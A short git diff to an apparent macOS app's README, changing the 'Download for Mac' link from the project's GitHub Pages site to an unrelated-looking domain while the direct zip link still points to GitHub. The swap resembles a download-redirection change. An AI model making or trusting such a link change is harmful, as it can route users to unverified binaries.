@@ -7,7 +7,7 @@ Copyright © 2026 Abhiram Upadrashta — MIT License
 
 ## Easiest way — download the app
 
-1. Go to **https://abhiramupadrashta.github.io/Veilon/** and click **Download for Mac**
+1. Go to **https://bubbles.foo.ng/Veilon/** and click **Download for Mac**
    (or download [Veilon.zip](https://github.com/AbhiramUpadrashta/Veilon/releases/latest/download/Veilon.zip) directly).
 2. Open **Veilon** from your Downloads folder and click **Move to Applications** — Veilon installs itself.
 3. Open Veilon from Applications. If macOS says it can't verify the app:
